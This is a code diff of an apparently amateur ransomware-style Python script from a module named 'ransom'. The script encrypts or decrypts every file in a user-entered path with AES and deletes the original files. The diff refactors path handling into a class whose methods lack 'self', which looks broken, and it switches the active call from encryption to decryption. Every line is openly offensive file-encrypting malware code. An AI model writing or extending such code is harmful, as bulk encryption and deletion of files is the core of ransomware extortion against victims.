@@ -1,5 +1,5 @@
-import list
-import os, random, struct
+from ransom import list
+import os, struct
 from Crypto.Cipher import AES
 
 def encrypt_file(key, in_file, out_file=None, chunksize=64*1024):
@@ -59,11 +59,19 @@ def AllDecrypt(flist, key):
                 decrypt_file(key, flist[i])
                 os.remove(flist[i])
 
-def Path():
-    flist = []
-    path = input("Input >> ")
-    flist = list.file_list(path)
-    return flist
+class Path:
+    def __init__(self, path):
+        self.__path = path
+
+    def inPath():
+        flist = []
+        path = input("Input >> ")
+        flist = list.file_list(path)
+        return flist
+
+    def Path(path):
+        flist = list.file_list(path)
+        return flist
 
 def KeyGenerator():
     key = input("Input Key (16 characters) >> ")
@@ -71,8 +79,8 @@ def KeyGenerator():
     return en_key
 
 
-files = Path()
+files = Path.inPath()
 key = KeyGenerator()
-print(type(key))
+
 # AllEncrypt(files, key)
-# AllDecrypt(files, key)
+AllDecrypt(files, key)
